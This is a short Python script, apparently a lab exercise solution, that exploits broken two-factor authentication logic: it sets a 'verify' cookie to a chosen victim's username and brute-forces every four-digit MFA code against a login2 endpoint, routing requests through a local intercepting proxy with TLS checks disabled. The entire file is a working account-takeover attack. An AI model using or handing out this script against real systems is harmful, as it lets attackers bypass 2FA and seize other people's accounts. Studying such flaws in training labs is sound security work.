# 2FA broken logic
import sys

import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def steal_cookie(url, target_name):
    complete_url = url + "login2"
    verify_cookie = {"verify": target_name}
    r = requests.get(complete_url, verify=False, proxies=proxies, timeout=5, cookies=verify_cookie)
    r.raise_for_status()
    print(r.text)
    print(f"{Fore.GREEN}[+] Ok, enter 4 digit 2FA code{Fore.RESET}")

    for i in range(10000):
    # Convert the integer to a 4-digit string with leading zeros
        code = f"{i:04}"
        print(code)
        data = {"mfa-code": code}
        r = requests.post(complete_url, verify=False, proxies=proxies, timeout=5, cookies=verify_cookie, data=data)
        r.raise_for_status()
        print("content-length: ", r.headers["Content-Length"])


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)

    url = sys.argv[1]
    target_name = input("Enter the target name: ")
    steal_cookie(url, target_name)


if __name__ == "__main__":
    main()
